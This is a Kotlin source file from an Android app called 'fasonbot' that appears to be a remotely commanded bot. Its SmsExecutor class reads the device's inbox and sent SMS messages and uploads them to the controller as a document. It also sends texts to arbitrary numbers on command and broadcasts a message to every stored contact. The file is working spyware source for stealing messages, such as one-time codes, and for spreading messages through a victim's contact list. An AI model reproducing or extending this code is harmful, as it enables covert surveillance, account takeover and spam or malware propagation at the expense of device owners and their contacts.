package com.fasonbot.app.action

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import android.os.Build
import android.telephony.SmsManager
import android.util.Log
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.util.PermissionHelper
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SmsExecutor(context: Context) : BaseExecutor(context) {

    companion object {
        private const val TAG = "SmsExecutor"
        private const val MAX_SMS = 200
        private const val MAX_SENT = 100
        private const val BROADCAST_DELAY = 500L
    }

    private val deviceId: String by lazy { DeviceManager.getDeviceId(context) }
    private val contactsExecutor = ContactsExecutor(context)

    @SuppressLint("Range")
    fun executeGetMessages() {
        if (!PermissionHelper.hasReadSms(context)) {
            sendResponse("❌ <b>Permission Denied</b>\n\nSMS access not granted.", parseMode = "HTML")
            return
        }
        try {
            val content = StringBuilder()
            content.append("💬 SMS MESSAGES\n")
            content.append("━━━━━━━━━━━━━━━━━━━━━━━━\n")
            content.append("📱 ${BotConfig.getDeviceName()}\n")
            content.append("🆔 $deviceId\n")
            content.append("━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            val dateFormat = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault())
            content.append("📥 INBOX\n")
            content.append("────────────────────────\n")
            context.contentResolver.query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC"
            )?.use { cursor ->
                while (cursor.moveToNext() && count < MAX_SMS) {
                    count++
                    val address = cursor.getString(cursor.getColumnIndex("address"))
                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    val date = cursor.getLong(cursor.getColumnIndex("date"))
                    val read = cursor.getInt(cursor.getColumnIndex("read"))
                    val dateStr = try { dateFormat.format(Date(date)) } catch (_: Exception) { "Unknown" }
                    val readIcon = if (read == 1) "✅" else "🔵"
                    content.append("$readIcon <b>$address</b>\n")
                    content.append("📅 $dateStr\n")
                    content.append("💬 ${body.take(200)}${if (body.length > 200) "..." else ""}\n")
                    content.append("────────────────────────\n")
                }
            }
            content.append("\n📤 SENT\n")
            content.append("────────────────────────\n")
            var sentCount = 0
            context.contentResolver.query(
                Uri.parse("content://sms/sent"), null, null, null, "date DESC"
            )?.use { cursor ->
                while (cursor.moveToNext() && sentCount < MAX_SENT) {
                    count++
                    sentCount++
                    val address = cursor.getString(cursor.getColumnIndex("address"))
                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    val date = cursor.getLong(cursor.getColumnIndex("date"))
                    val dateStr = try { dateFormat.format(Date(date)) } catch (_: Exception) { "Unknown" }
                    content.append("📤 <b>$address</b>\n")
                    content.append("📅 $dateStr\n")
                    content.append("💬 ${body.take(200)}${if (body.length > 200) "..." else ""}\n")
                    content.append("────────────────────────\n")
                }
            }
            content.append("\n📊 Total: $count messages")
            sendFileAsDocument("SMS_${BotConfig.getDeviceName()}", content.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Get messages error: ${e.message}")
            sendResponse("❌ <b>Error</b>\n\n${e.message}", parseMode = "HTML")
        }
    }

    @SuppressLint("NewApi")
    fun executeSendSms(number: String, message: String) {
        if (!PermissionHelper.hasSendSms(context)) {
            sendResponse("❌ <b>Permission Denied</b>\n\nSMS permission not granted.", parseMode = "HTML")
            return
        }
        try {
            val smsManager = getSmsManager()
            val parts = smsManager.divideMessage(message)
            if (parts.size > 1) {
                smsManager.sendMultipartTextMessage(number, null, parts, null, null)
            } else {
                smsManager.sendTextMessage(number, null, message, null, null)
            }
            sendResponse(
                "✅ <b>SMS Sent</b>\n\n📞 To: <code>$number</code>\n💬 Message delivered successfully",
                parseMode = "HTML"
            )
        } catch (e: Exception) {
            Log.e(TAG, "Send SMS error: ${e.message}")
            sendResponse("❌ <b>Failed to Send</b>\n\n${e.message}", parseMode = "HTML")
        }
    }

    @SuppressLint("NewApi")
    fun executeBroadcastSms(message: String) {
        if (!PermissionHelper.hasReadContacts(context) || !PermissionHelper.hasSendSms(context)) {
            sendResponse("❌ <b>Permission Denied</b>\n\nRequired permissions not granted.", parseMode = "HTML")
            return
        }
        try {
            val phoneNumbers = contactsExecutor.getAllPhoneNumbers()
            var sentCount = 0
            var failedCount = 0
            val smsManager = getSmsManager()
            for (phoneNo in phoneNumbers) {
                try {
                    smsManager.sendTextMessage(phoneNo, null, message, null, null)
                    sentCount++
                    Thread.sleep(BROADCAST_DELAY)
                } catch (_: Exception) {
                    failedCount++
                }
            }
            sendResponse(
                buildString {
                    append("📢 <b>Broadcast Complete</b>\n\n")
                    append("✅ Sent: <b>$sentCount</b>\n")
                    if (failedCount > 0) {
                        append("❌ Failed: <b>$failedCount</b>\n")
                    }
                    append("📊 Total: <b>${phoneNumbers.size}</b> contacts")
                },
                parseMode = "HTML"
            )
        } catch (e: Exception) {
            Log.e(TAG, "Broadcast SMS error: ${e.message}")
            sendResponse("❌ <b>Broadcast Failed</b>\n\n${e.message}", parseMode = "HTML")
        }
    }

    private fun getSmsManager(): SmsManager {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            context.getSystemService(SmsManager::class.java)
        } else {
            @Suppress("DEPRECATION")
            SmsManager.getDefault()
        }
    }

    private fun sendFileAsDocument(name: String, content: String) {
        var file: File? = null
        try {
            file = createTempFile(name, content)
            if (file != null) {
                sendDocument(file, caption = "💬 SMS Messages")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send file error: ${e.message}")
            sendResponse("❌ <b>Error</b>\n\n${e.message}", parseMode = "HTML")
        } finally {
            deleteTempFile(file)
        }
    }
}
